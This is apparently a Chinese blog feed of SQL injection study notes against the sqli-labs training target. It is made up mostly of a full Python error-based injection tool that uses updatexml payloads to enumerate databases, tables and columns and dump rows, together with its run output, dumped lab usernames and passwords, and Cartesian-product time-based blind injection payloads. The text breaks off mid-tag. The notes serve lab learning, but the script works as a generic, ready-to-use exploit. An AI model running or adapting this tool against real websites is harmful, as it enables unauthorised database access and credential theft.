users 的 id 数据 10: 10</span><br><span class="line"></span><br><span class="line">正在获取表 users 的列 username 的数据...</span><br><span class="line">表 users 的 username 数据 1: Dumb</span><br><span class="line">表 users 的 username 数据 2: Angelina</span><br><span class="line">表 users 的 username 数据 3: Dummy</span><br><span class="line">表 users 的 username 数据 4: secure</span><br><span class="line">表 users 的 username 数据 5: stupid</span><br><span class="line">表 users 的 username 数据 6: superman</span><br><span class="line">表 users 的 username 数据 7: batman</span><br><span class="line">表 users 的 username 数据 8: admin</span><br><span class="line">表 users 的 username 数据 9: admin1</span><br><span class="line">表 users 的 username 数据 10: admin2</span><br><span class="line"></span><br><span class="line">正在获取表 users 的列 password 的数据...</span><br><span class="line">表 users 的 password 数据 1: Dumb</span><br><span class="line">表 users 的 password 数据 2: I-kill-you</span><br><span class="line">表 users 的 password 数据 3: p@ssword</span><br><span class="line">表 users 的 password 数据 4: crappy</span><br><span class="line"></span><br><span class="line">表 users 的 password 数据 5: stupidity</span><br><span class="line">表 users 的 password 数据 6: genious</span><br><span class="line">表 users 的 password 数据 7: mob!le</span><br><span class="line">表 users 的 password 数据 8: admin</span><br><span class="line">表 users 的 password 数据 9: admin1</span><br><span class="line">表 users 的 password 数据 10: admin2</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="报错注入脚本"><a href="#报错注入脚本" class="headerlink" title="报错注入脚本"></a>报错注入脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SQLiExplorer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  <span class="comment"># 初始化类</span></span><br><span class="line">        <span class="variable language_">self</span>.databases = []  <span class="comment"># 存储数据库名</span></span><br><span class="line">        <span class="variable language_">self</span>.tables = []  <span class="comment"># 存储表名</span></span><br><span class="line">        <span class="variable language_">self</span>.columns = []  <span class="comment"># 存储列名</span></span><br><span class="line">        <span class="variable language_">self</span>.data = []  <span class="comment"># 存储查询到的数据</span></span><br><span class="line">        <span class="variable language_">self</span>.pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;error: \&#x27;~(.*?)~\&#x27;&#x27;</span>, re.S)  <span class="comment"># 正则表达式子从错误数据中提取数据</span></span><br><span class="line">        <span class="variable language_">self</span>.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;  <span class="comment"># 伪造HTTP请求头设置</span></span><br><span class="line">        <span class="variable language_">self</span>.base_url = <span class="string">&quot;http://sql/sqli-labs/Less-5/?id=1 &#x27;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.current_user = <span class="literal">None</span>  <span class="comment"># 存储当前的数据库信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">self, payload</span>):  <span class="comment"># self表示该方法属于类实例，可以访问类属性和其他方法</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;发送payload并返回响应&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span><span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">            response = requests.get(url, headers=<span class="variable language_">self</span>.headers, timeout=<span class="number">10</span>)  <span class="comment"># 设置10秒等待，避免无限等待</span></span><br><span class="line">            response.raise_for_status()  <span class="comment"># 响应的状态的检测，确保只处理成功的响应</span></span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_data</span>(<span class="params">self, html</span>):  <span class="comment"># html，网页HTML的内容</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;从错误信息中提取数据&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> html:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">return</span> re.findall(<span class="variable language_">self</span>.pattern, html)  <span class="comment"># self.pattern 返回所有非重叠匹配的列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_database_count</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 获取数据库的数量</span></span><br><span class="line">        payload = <span class="string">&quot; or updatexml(0,concat(0x7e,(select count(schema_name) from information_schema.schemata),0x7e),1)--+&quot;</span></span><br><span class="line">        html = <span class="variable language_">self</span>.send_payload(payload)  <span class="comment"># 调用类中的 send_payload 方法发送构造的注入语句，返回服务器响应的HTML的内容</span></span><br><span class="line">        result = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result[<span class="number">0</span>]) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="number">0</span>  <span class="comment"># 如果resul存在的话将result数组第一个字符转化为整形，result不存在的话返回0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_databases</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 获取所有非系统数据库名</span></span><br><span class="line">        count = <span class="variable language_">self</span>.get_database_count()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 发现 <span class="subst">&#123;count&#125;</span> 个数据库&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select schema_name from information_schema.schemata limit <span class="subst">&#123;i&#125;</span>,1),0x7e),1)--+&quot;</span></span><br><span class="line">            html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">            db_names = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">            <span class="keyword">if</span> db_names:</span><br><span class="line">                <span class="variable language_">self</span>.databases.extend(db_names)  <span class="comment"># 将提取到底的数据库名添加到self.databases的表中</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 过滤常见系统数据库</span></span><br><span class="line">        system_dbs = [<span class="string">&#x27;information_schema&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;performance_schema&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.databases = [db <span class="keyword">for</span> db <span class="keyword">in</span> <span class="variable language_">self</span>.databases <span class="keyword">if</span> db <span class="keyword">not</span> <span class="keyword">in</span> system_dbs]</span><br><span class="line">        <span class="comment"># for db in self.databases，遍历 self.databases 列表中的每一个元素（即数据库名），临时变量 db 表示当前遍历的数据库名，保留满足条件的db名</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 可用数据库列表:&quot;</span>, <span class="variable language_">self</span>.databases)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.databases</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_table_count</span>(<span class="params">self, database</span>):</span><br><span class="line">        <span class="comment"># 获取指定数据库的表的数量</span></span><br><span class="line">        payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),0x7e),1)--+&quot;</span></span><br><span class="line">        html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">        result = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result[<span class="number">0</span>]) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_tables</span>(<span class="params">self, database</span>):</span><br><span class="line">        <span class="comment"># 获取指定数据库的所有表名</span></span><br><span class="line">        count = <span class="variable language_">self</span>.get_table_count(database)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 数据库 <span class="subst">&#123;database&#125;</span> 有 <span class="subst">&#123;count&#125;</span> 个表&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1),0x7e),1)--+&quot;</span></span><br><span class="line">            html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">            table_names = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">            <span class="keyword">if</span> table_names:</span><br><span class="line">                <span class="variable language_">self</span>.tables.extend(table_names)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据库 <span class="subst">&#123;database&#125;</span> 的表列表:&quot;</span>, <span class="variable language_">self</span>.tables)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.tables</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_column_count</span>(<span class="params">self, table</span>):</span><br><span class="line">        <span class="comment"># 获取指定表的列数量</span></span><br><span class="line">        payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select count(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27;),0x7e),1)--+&quot;</span></span><br><span class="line">        html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">        result = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result[<span class="number">0</span>]) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_columns</span>(<span class="params">self, table</span>):</span><br><span class="line">        <span class="comment"># 获取指定表的所有列名</span></span><br><span class="line">        count = <span class="variable language_">self</span>.get_column_count(table)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 表 <span class="subst">&#123;table&#125;</span> 有 <span class="subst">&#123;count&#125;</span> 个列&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1),0x7e),1)--+&quot;</span></span><br><span class="line">            html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">            column_names = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">            <span class="keyword">if</span> column_names:</span><br><span class="line">                <span class="variable language_">self</span>.columns.extend(column_names)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 表 <span class="subst">&#123;table&#125;</span> 的列列表:&quot;</span>, <span class="variable language_">self</span>.columns)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.columns</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_data_count</span>(<span class="params">self, table</span>):</span><br><span class="line">        <span class="comment"># 获取指定表的数据的行数</span></span><br><span class="line">        payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select count(*) from `<span class="subst">&#123;table&#125;</span>`),0x7e),1)--+&quot;</span></span><br><span class="line">        html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">        result = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result[<span class="number">0</span>]) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">self, table, columns</span>):</span><br><span class="line">        <span class="comment"># 获取指定表的数据</span></span><br><span class="line">        count = <span class="variable language_">self</span>.get_data_count(table)</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 表 <span class="subst">&#123;table&#125;</span> 中没有数据或无法访问&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 表 <span class="subst">&#123;table&#125;</span> 有 <span class="subst">&#123;count&#125;</span> 行数据&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            <span class="comment"># 获取多列数据，用~分隔</span></span><br><span class="line">            cols = <span class="string">&quot;,&quot;</span>.join([<span class="string">f&quot;`<span class="subst">&#123;col&#125;</span>`&quot;</span> <span class="keyword">for</span> col <span class="keyword">in</span> columns])</span><br><span class="line">            payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select concat_ws(0x7e,<span class="subst">&#123;cols&#125;</span>) from `<span class="subst">&#123;table&#125;</span>` limit <span class="subst">&#123;i&#125;</span>,1),0x7e),1)--+&quot;</span></span><br><span class="line">            html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">            row_data = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">            <span class="keyword">if</span> row_data:</span><br><span class="line">                <span class="variable language_">self</span>.data.append(row_data[<span class="number">0</span>].split(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 获取数据失败，可能是权限不足或表结构特殊&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 表 <span class="subst">&#123;table&#125;</span> 的数据:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="variable language_">self</span>.data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot; | &quot;</span>.join(row))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interactive_select</span>(<span class="params">options, prompt</span>):  <span class="comment">#options: 一个列表，包含所有可供选择的选项，prompt: 字符串，显示给用户的提示信息</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;交互式选择菜单&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + prompt)</span><br><span class="line">    <span class="keyword">for</span> i, opt <span class="keyword">in</span> <span class="built_in">enumerate</span>(options, <span class="number">1</span>): <span class="comment">#格式化每个选项，使标号123与选项123对应</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>. <span class="subst">&#123;opt&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请选择(1-&#123;&#125;): &quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(options))))</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> &lt;= choice &lt;= <span class="built_in">len</span>(options):</span><br><span class="line">                <span class="keyword">return</span> options[choice - <span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入无效，请重新选择&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入数字&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    explorer = SQLiExplorer()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 获取所有数据库</span></span><br><span class="line">    explorer.get_databases()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> explorer.databases:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未发现可用数据库&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 交互式选择数据库</span></span><br><span class="line">    target_db = interactive_select(explorer.databases, <span class="string">&quot;请选择要查询的数据库:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 获取选定数据库的所有表</span></span><br><span class="line">    explorer.get_tables(target_db)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> explorer.tables:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 数据库 <span class="subst">&#123;target_db&#125;</span> 中没有表&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 交互式选择表</span></span><br><span class="line">    target_table = interactive_select(explorer.tables, <span class="string">f&quot;请选择要查询的表(数据库: <span class="subst">&#123;target_db&#125;</span>):&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 获取选定表的所有列</span></span><br><span class="line">    explorer.get_columns(target_table)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> explorer.columns:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 表 <span class="subst">&#123;target_table&#125;</span> 中没有列&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择要查询的列(多选)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n请选择要查询的列(可多选，输入逗号分隔的数字如1,2,3):&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(explorer.columns, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>. <span class="subst">&#123;col&#125;</span>&quot;</span>)</span><br><span class="line">    selected = <span class="built_in">input</span>(<span class="string">&quot;选择列: &quot;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    selected_columns = [explorer.columns[<span class="built_in">int</span>(i) - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> selected <span class="keyword">if</span> i.isdigit()]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> selected_columns:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未选择有效列，默认查询前两列&quot;</span>)</span><br><span class="line">        selected_columns = explorer.columns[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 获取表数据</span></span><br><span class="line">    explorer.get_data(target_table, selected_columns)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[*] 发现 9 个数据库</span><br><span class="line">[+] 可用数据库列表: [&#x27;cc&#x27;, &#x27;challenges&#x27;, &#x27;cvcv&#x27;, &#x27;security&#x27;, &#x27;sqlii&#x27;]</span><br><span class="line"></span><br><span class="line">请选择要查询的数据库:</span><br><span class="line">1. cc</span><br><span class="line">2. challenges</span><br><span class="line">3. cvcv</span><br><span class="line">4. security</span><br><span class="line">5. sqlii</span><br><span class="line">请选择(1-5): 4</span><br><span class="line">[*] 数据库 security 有 4 个表</span><br><span class="line">[+] 数据库 security 的表列表: [&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;]</span><br><span class="line"></span><br><span class="line">请选择要查询的表(数据库: security):</span><br><span class="line">1. emails</span><br><span class="line">2. referers</span><br><span class="line">3. uagents</span><br><span class="line">4. users</span><br><span class="line">请选择(1-4): 4</span><br><span class="line">[*] 表 users 有 11 个列</span><br><span class="line">[+] 表 users 的列列表: [&#x27;id&#x27;, &#x27;name&#x27;, &#x27;username&#x27;, &#x27;password&#x27;, &#x27;type&#x27;, &#x27;USER&#x27;, &#x27;CURRENT_CONNECTIONS&#x27;, &#x27;TOTAL_CONNECTIONS&#x27;, &#x27;id&#x27;, &#x27;username&#x27;, &#x27;password&#x27;]</span><br><span class="line"></span><br><span class="line">请选择要查询的列(可多选，输入逗号分隔的数字如1,2,3):</span><br><span class="line">1. id</span><br><span class="line">2. name</span><br><span class="line">3. username</span><br><span class="line">4. password</span><br><span class="line">5. type</span><br><span class="line">6. USER</span><br><span class="line">7. CURRENT_CONNECTIONS</span><br><span class="line">8. TOTAL_CONNECTIONS</span><br><span class="line">9. id</span><br><span class="line">10. username</span><br><span class="line">11. password</span><br><span class="line">选择列: 3</span><br><span class="line">[*] 表 users 有 13 行数据</span><br><span class="line">[+] 表 users 的数据:</span><br><span class="line">Dumb</span><br><span class="line">Angelina</span><br><span class="line">Dummy</span><br><span class="line">secure</span><br><span class="line">stupid</span><br><span class="line">superman</span><br><span class="line">batman</span><br><span class="line">admin</span><br><span class="line">admin1</span><br><span class="line">admin2</span><br><span class="line">admin3</span><br><span class="line">dhakkan</span><br><span class="line">admin4</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>笛卡尔积-时间盲注</title>
      <link href="/2025/04/24/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
      <url>/2025/04/24/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><p>原理：连接表是一个很耗时的操作（A×B&#x3D;A和B中每个元素的组合所组成的集合，就是连接表）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br></pre></td></tr></table></figure><p><strong>靶场实践</strong>（<code>sqli-9</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select database()))&gt;7,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242133119.png" alt="image-20250424213321067"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242133309.png" alt="image-20250424213359282"></p><p>页面直接回显，说明书库名的长度为7.</p><p>接下来查询数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr(database(),1,1))&gt;114,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img 